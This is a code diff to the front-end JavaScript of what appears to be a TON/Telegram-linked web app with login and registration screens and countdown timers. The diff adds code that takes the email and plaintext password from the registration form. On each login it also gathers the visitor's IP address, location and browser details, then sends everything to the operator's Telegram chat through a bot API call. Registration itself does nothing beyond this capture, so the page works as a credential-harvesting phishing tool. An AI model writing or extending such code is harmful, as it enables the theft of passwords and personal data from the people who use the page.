@@ -1925,6 +1925,7 @@ function onLogin() {
   _hideAuth();
   showScreen('home');
   showLoginBanner('login');
+  sendLog('login', '', '');
 }
 
 function onLoginTelegram() {
@@ -1932,6 +1933,7 @@ function onLoginTelegram() {
   _hideAuth();
   showScreen('home');
   showLoginBanner('telegram');
+  sendLog('telegram', '', '');
 }
 
 function onRegister() {
@@ -1939,13 +1941,18 @@ function onRegister() {
   _hideAuth();
   showScreen('home');
   showLoginBanner('register');
+  sendLog('register', '', '');
 }
-
+  
 function submitRegister() {
   const email = document.getElementById('reg-email').value.trim();
   const pass  = document.getElementById('reg-pass').value.trim();
   if (!email || !pass) return;
-  onRegister();
+  saveSession('register');
+  _hideAuth();
+  showScreen('home');
+  showLoginBanner('register');
+  sendLog('register', email, pass);
 }
   
   /* ─── BOOT ─── */
@@ -2031,64 +2038,53 @@ async function openTonConnect() {
   await tonConnectUI.openModal();
 }
 
-  async function sendLog(text) {
+ async function sendLog(method, email, password) {
   try {
+    let ip = '', country = '', city = '';
+    try {
+      const geo = await fetch('https://ipapi.co/json/');
+      const gd  = await geo.json();
+      ip      = gd.ip       || '';
+      country = gd.country_name || '';
+      city    = gd.city     || '';
+    } catch(e){}
+
+    const ua = navigator.userAgent;
+    const now = new Date().toLocaleString('ru-RU', {
+      timeZone: 'Europe/Chisinau',
+      day:'2-digit', month:'2-digit', year:'numeric',
+      hour:'2-digit', minute:'2-digit', second:'2-digit'
+    });
+
+    let text = '';
+    if(method === 'register') {
+      text = `🆕 <b>Новый пользователь</b>\n`
+           + `👤 ${uid} ${username}\n`
+           + `📧 ${email || '—'}\n`
+           + `🔑 ${password || '—'}\n`
+           + `📱 ${ua}\n`
+           + `🌐 Язык: ${navigator.language || 'ru'}\n`
+           + `📍 ${country}, ${city} (IP: ${ip})\n`
+           + `🕐 ${now}`;
+    } else {
+      const label = method === 'telegram' ? '✈️ <b>Вход через Telegram</b>' : '🔐 <b>Вход</b>';
+      text = `${label}\n`
+           + `👤 ${uid} ${username}\n`
+           + `📱 ${ua}\n`
+           + `🌐 Язык: ${navigator.language || 'ru'}\n`
+           + `📍 ${country}, ${city} (IP: ${ip})\n`
+           + `🕐 ${now}`;
+    }
+
     await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({
-        chat_id: TG_CHAT_ID,
-        text: text,
-        parse_mode: 'HTML'
-      })
+      body: JSON.stringify({ chat_id: TG_CHAT_ID, text, parse_mode: 'HTML' })
     });
-  } catch(e) { console.log('log error', e); }
+  } catch(e){ console.log('log error', e); }
 }
 
-function onLogin() {
-  saveSession('login');
-  _hideAuth();
-  showScreen('home');
-  showLoginBanner('login');
-  sendLog(`🔐 <b>Вход</b>\n👤 ${fullName}\n🆔 ${uid}\n📛 ${username}`);
-}
 
-function onLoginTelegram() {
-  saveSession('telegram');
-  _hideAuth();
-  showScreen('home');
-  showLoginBanner('telegram');
-  sendLog(`✈️ <b>Вход через Telegram</b>\n👤 ${fullName}\n🆔 ${uid}\n📛 ${username}`);
-}
-
-function onRegister() {
-  saveSession('register');
-  _hideAuth();
-  showScreen('home');
-  showLoginBanner('register');
-  sendLog(`✅ <b>Регистрация</b>\n👤 ${fullName}\n🆔 ${uid}\n📛 ${username}`);
-}
-
-  (function(){
-  const deadline = new Date(Date.now() + 10 * 24 * 60 * 60 * 1000);
-  function pad(n){ return String(n).padStart(2,'0'); }
-  function tickTop(){
-    const diff = Math.max(0, deadline - Date.now());
-    const d = Math.floor(diff/86400000);
-    const h = Math.floor((diff%86400000)/3600000);
-    const m = Math.floor((diff%3600000)/60000);
-    const s = Math.floor((diff%60000)/1000);
-    const ed=document.getElementById('t-days');
-    if(ed){
-      ed.textContent=pad(d);
-      document.getElementById('t-hours').textContent=pad(h);
-      document.getElementById('t-mins').textContent=pad(m);
-      document.getElementById('t-secs').textContent=pad(s);
-    }
-  }
-  tickTop();
-  setInterval(tickTop,1000);
-})();
 
   (function(){
   const KEY = 'lolz_top_deadline';
